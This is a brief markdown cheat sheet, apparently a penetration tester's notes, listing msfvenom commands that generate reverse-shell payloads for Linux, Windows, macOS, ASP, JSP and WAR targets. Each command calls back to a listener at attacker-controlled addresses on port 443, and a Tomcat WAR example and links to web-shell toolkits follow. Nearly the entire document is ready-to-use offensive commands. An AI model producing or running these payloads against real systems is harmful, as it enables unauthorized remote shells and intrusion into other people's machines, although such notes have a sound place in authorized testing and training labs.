# Shells

***

https://www.revshells.com/

## Payloads

| Payload Description                               | MSFvenom Command                                                                                   |
| ------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| Linux-based Reverse Shell (Stageless Payload)     | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`     |
| Windows-based Reverse Shell (Stageless Payload)   | `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`       |
| MacOS-based Reverse Shell Payload                 | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`   |
| ASP Web Reverse Shell Payload                     | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` |
| JSP Web Reverse Shell Payload (Raw)               | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`      |
| WAR Java/JSP Compatible Web Reverse Shell Payload | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`      |

* Laudanumla:
* Antak: https://github.com/samratashok/nishang

## Tomcat War

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war
```
